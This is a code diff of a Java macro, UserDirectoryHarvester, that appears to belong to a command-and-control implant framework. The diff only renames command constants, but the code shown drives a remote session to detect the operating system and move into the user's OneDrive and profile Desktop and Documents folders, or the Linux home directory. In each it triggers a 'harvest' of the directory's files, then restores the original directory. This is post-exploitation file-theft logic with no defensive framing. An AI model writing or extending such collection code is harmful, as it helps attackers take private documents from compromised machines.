@@ -18,7 +18,7 @@ public class UserDirectoryHarvester extends AbstractCommandMacro {
 	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
 		MacroOutcome outcome = new MacroOutcome();
 		
-		sendCommand(Commands.OS_HERITAGE, sessionId, outcome);
+		sendCommand(Commands.CLIENT_CMD_OS_HERITAGE, sessionId, outcome);
 		String response = awaitResponse(sessionId, outcome);
 		response = response.replace(System.lineSeparator(), "");
 		if(!response.equals(Commands.OS_HERITAGE_RESPONSE_WINDOWS) && !response.equals(Commands.OS_HERITAGE_RESPONSE_LINUX)) {
@@ -28,7 +28,7 @@ public class UserDirectoryHarvester extends AbstractCommandMacro {
 		
 		String os = response;
 		
-		sendCommand(Commands.PWD, sessionId, outcome);
+		sendCommand(Commands.CLIENT_CMD_PWD, sessionId, outcome);
 		response = awaitResponse(sessionId, outcome);
 		String originalDirectory = null;
 		if (!response.equals("")) {
@@ -44,24 +44,24 @@ public class UserDirectoryHarvester extends AbstractCommandMacro {
 		try {
 			String onedriveDir = WindowsCmdLineHelper.resolveVariableDirectory(io, sessionId, "%ONEDRIVE%");
 			outcome.addMacroMessage("Found OneDrive folder: " + onedriveDir);
-			String cdToODDesktopCmd = Commands.CD + " " + onedriveDir + "\\Desktop";
+			String cdToODDesktopCmd = Commands.CLIENT_CMD_CD + " " + onedriveDir + "\\Desktop";
 			sendCommand(cdToODDesktopCmd, sessionId, outcome);
 			response = awaitResponse(sessionId, outcome);
 			response = response.replace(System.lineSeparator(), "");
 			if (!response.equals(onedriveDir + "\\Desktop")) {
 				outcome.addError("Unable to switch to OneDrive Desktop for harvest");
 			} else {
-				sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
+				sendCommand(Commands.CLIENT_CMD_HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
 				response = awaitResponse(sessionId, outcome);
 			}
-			String cdToODDocumentsCmd = Commands.CD + " "  + onedriveDir + "\\Documents";
+			String cdToODDocumentsCmd = Commands.CLIENT_CMD_CD + " "  + onedriveDir + "\\Documents";
 			sendCommand(cdToODDocumentsCmd, sessionId, outcome);
 			response = awaitResponse(sessionId, outcome);
 			response = response.replace(System.lineSeparator(), "");
 			if (!response.contains(onedriveDir + "\\Documents")) {//Why contains? b/c we might get the Harvest Complete ack too
 				outcome.addError("Unable to switch to OneDrive Documents for harvest");
 			} else {
-				sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
+				sendCommand(Commands.CLIENT_CMD_HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
 				response = awaitResponse(sessionId, outcome);
 			}
 		}catch (Exception ex) {
@@ -71,41 +71,41 @@ public class UserDirectoryHarvester extends AbstractCommandMacro {
 		try {
 			String profileDir = WindowsCmdLineHelper.resolveVariableDirectory(io, sessionId, "%USERPROFILE%");
 			outcome.addMacroMessage("Found user profile folder: " + profileDir);
-			String cdToDesktopCmd = Commands.CD + " "  + profileDir + "\\Desktop";
+			String cdToDesktopCmd = Commands.CLIENT_CMD_CD + " "  + profileDir + "\\Desktop";
 			sendCommand(cdToDesktopCmd, sessionId, outcome);
 			response = awaitResponse(sessionId, outcome);
 			if (!response.contains(profileDir + "\\Desktop")) {//We still might get the "harvest complete"
 				outcome.addError("Unable to switch to OneDrive Desktop for harvest");
 			} else {
-				sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
+				sendCommand(Commands.CLIENT_CMD_HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
 				response = awaitResponse(sessionId, outcome);
 			}
-			String cdToDocumentsCmd = Commands.CD + " "  + profileDir + "\\Documents";
+			String cdToDocumentsCmd = Commands.CLIENT_CMD_CD + " "  + profileDir + "\\Documents";
 			sendCommand(cdToDocumentsCmd, sessionId, outcome);
 			response = awaitResponse(sessionId, outcome);
 			if (!response.contains(profileDir + "\\Documents")) {//Why contains? b/c we might get the Harvest Complete ack too
 				outcome.addError("Unable to switch to OneDrive Documents for harvest");
 			} else {
-				sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
+				sendCommand(Commands.CLIENT_CMD_HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
 				response = awaitResponse(sessionId, outcome);
 			}
 		}catch (Exception ex) {
 			outcome.addMacroMessage("Could not find user profile folder, proceedind.");
 		}
 		}else {//Linux
-			String cdToHomeDir = Commands.CD + " ~";
+			String cdToHomeDir = Commands.CLIENT_CMD_CD + " ~";
 			sendCommand(cdToHomeDir, sessionId, outcome);
 			response = awaitResponse(sessionId, outcome);
 			if(response.contains("no such file or directory")) {
 				outcome.addError("Cannot switch to Linux home directory");
 			}else {
-				sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
+				sendCommand(Commands.CLIENT_CMD_HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
 				response = awaitResponse(sessionId, outcome);
 			}
 		}
 		
 		//Restore original
-		sendCommand(Commands.CD + " " + originalDirectory, sessionId, outcome);
+		sendCommand(Commands.CLIENT_CMD_CD + " " + originalDirectory, sessionId, outcome);
 		response = awaitResponse(sessionId, outcome);
 		response = response.replace(System.lineSeparator(), "");
 		if (!response.equals(originalDirectory)) {
